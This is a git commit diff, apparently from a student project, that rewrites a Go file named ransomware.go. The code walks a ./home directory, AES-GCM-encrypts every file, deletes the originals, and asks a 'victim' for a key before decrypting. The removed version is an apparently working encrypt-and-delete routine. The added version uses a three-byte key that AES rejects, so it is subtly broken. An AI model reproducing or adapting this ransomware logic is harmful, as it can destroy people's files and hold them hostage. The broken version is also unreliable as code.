359ed3a2459d3d91425629fdcf4f88cd3f5dd51b
Sinclair Collins <220711666@students.uajy.ac.id>
2024-11-10 16:26:58 +0700

    baru

--- ransomware.go
+++ ransomware.go
@@ -3,120 +3,106 @@ package main
 import (
 	"crypto/aes"
 	"crypto/cipher"
-	"crypto/rand"
 	"fmt"
-	"io"
 	"os"
 	"path/filepath"
-	"strings"
+	"io"
+	"crypto/rand"
 )
 
-// Function to encrypt a file
-func encryptFile(path string, gcm cipher.AEAD) {
-	original, err := os.ReadFile(path)
-	if err != nil {
-		fmt.Println("Error while reading file:", err)
-		return
-	}
-
-	nonce := make([]byte, gcm.NonceSize())
-	io.ReadFull(rand.Reader, nonce)
-	encrypted := gcm.Seal(nonce, nonce, original, nil)
-
-	err = os.WriteFile(path+".enc", encrypted, 0666)
-	if err != nil {
-		fmt.Println("Error while writing encrypted file:", err)
-	} else {
-		os.Remove(path)
-	}
-}
-
-// Function to decrypt a file
-func decryptFile(path string, gcm cipher.AEAD) {
-	encrypted, err := os.ReadFile(path)
-	if err != nil {
-		fmt.Println("Error while reading encrypted file:", err)
-		return
-	}
-
-	nonce := encrypted[:gcm.NonceSize()]
-	encrypted = encrypted[gcm.NonceSize():]
-	original, err := gcm.Open(nil, nonce, encrypted, nil)
-	if err != nil {
-		fmt.Println("Error while decrypting file:", err)
-		return
-	}
-
-	err = os.WriteFile(path[:len(path)-4], original, 0666)
-	if err != nil {
-		fmt.Println("Error while writing decrypted file:", err)
-	} else {
-		os.Remove(path)
-	}
-}
-
-// Function to process files (encrypt or decrypt)
-func processFiles(action string, gcm cipher.AEAD) {
+func encryptFiles(gcm cipher.AEAD) {
+	// Loop through target files and encrypt them
 	filepath.Walk("./home", func(path string, info os.FileInfo, err error) error {
-		if err != nil {
-			fmt.Println("Error while walking file path:", err)
-			return nil
-		}
-
+		// Skip if it's a directory
 		if !info.IsDir() {
-			if strings.HasSuffix(path, ".enc") && action == "decrypt" {
-				fmt.Println("Decrypting " + path + "...")
-				decryptFile(path, gcm)
-			} else if !strings.HasSuffix(path, ".enc") && action == "encrypt" {
-				fmt.Println("Encrypting " + path + "...")
-				encryptFile(path, gcm)
+			// Encrypt the file
+			fmt.Println("Encrypting " + path + "...")
+
+			// Read file contents
+			original, err := os.ReadFile(path)
+			if err == nil {
+				// Encrypt bytes
+				nonce := make([]byte, gcm.NonceSize())
+				io.ReadFull(rand.Reader, nonce)
+				encrypted := gcm.Seal(nonce, nonce, original, nil)
+
+				// Write encrypted contents
+				err = os.WriteFile(path + ".enc", encrypted, 0666)
+				if err == nil {
+					os.Remove(path) // Delete the original file
+				} else {
+					fmt.Println("Error while writing contents")
+				}
+			} else {
+				fmt.Println("Error while reading file contents")
 			}
 		}
 		return nil
 	})
 }
 
-// Function to get the AES key (hardcoded)
-func getKey() (cipher.AEAD, error) {
-	// Hardcoded key (change this to your desired key)
-	key := []byte("thisisthesecretkeythatwillbeused")
+func decryptFiles(gcm cipher.AEAD) {
+	// Loop through target encrypted files and decrypt them
+	filepath.Walk("./home", func(path string, info os.FileInfo, err error) error {
+		// Skip if it's a directory or not an encrypted file
+		if !info.IsDir() && path[len(path)-4:] == ".enc" {
+			// Decrypt the file
+			fmt.Println("Decrypting " + path + "...")
 
-	// Use the hardcoded key for AES encryption
-	block, err := aes.NewCipher(key)
-	if err != nil {
-		return nil, err
-	}
+			// Read file contents
+			encrypted, err := os.ReadFile(path)
+			if err == nil {
+				// Decrypt bytes
+				nonce := encrypted[:gcm.NonceSize()]
+				encrypted = encrypted[gcm.NonceSize():]
+				original, err := gcm.Open(nil, nonce, encrypted, nil)
 
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return nil, err
-	}
-
-	return gcm, nil
+				// Write decrypted contents
+				err = os.WriteFile(path[:len(path)-4], original, 0666)
+				if err == nil {
+					os.Remove(path) // Delete the encrypted file
+				} else {
+					fmt.Println("Error while writing contents")
+				}
+			} else {
+				fmt.Println("Error while reading file contents")
+			}
+		}
+		return nil
+	})
 }
 
 func main() {
-	// Automatically encrypt the files when the program starts
-	gcm, err := getKey()
+	// Set the hardcoded key to "123" for encryption and decryption
+	key := []byte("123")
+
+	// Initialize AES in GCM mode
+	block, err := aes.NewCipher(key)
 	if err != nil {
-		fmt.Println("Error setting up AES:", err)
-		return
+		panic("Error while setting up AES")
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		panic("Error while setting up GCM")
 	}
 
-	// Encrypt all files
+	// Encrypt files automatically
 	fmt.Println("Encrypting files...")
-	processFiles("encrypt", gcm)
+	encryptFiles(gcm)
 
-	// Ask for the decryption key after encryption
-	fmt.Println("\nFiles encrypted. Please enter the decryption key to unlock your files.")
+	// Simulate the victim entering the correct key (here we hardcode it for simplicity)
+	// In a real-world scenario, you would prompt the victim to input the key
+	fmt.Println("Enter decryption key: ")
+	var inputKey string
+	fmt.Scanln(&inputKey)
 
-	// Decrypt files after key is provided
-	gcm, err = getKey()
-	if err != nil {
-		fmt.Println("Error setting up AES for decryption:", err)
+	// Validate the entered key
+	if inputKey != "123" {
+		fmt.Println("Invalid key! Decryption failed.")
 		return
 	}
 
+	// If the correct key is entered, decrypt the files
 	fmt.Println("Decrypting files...")
-	processFiles("decrypt", gcm)
+	decryptFiles(gcm)
 }
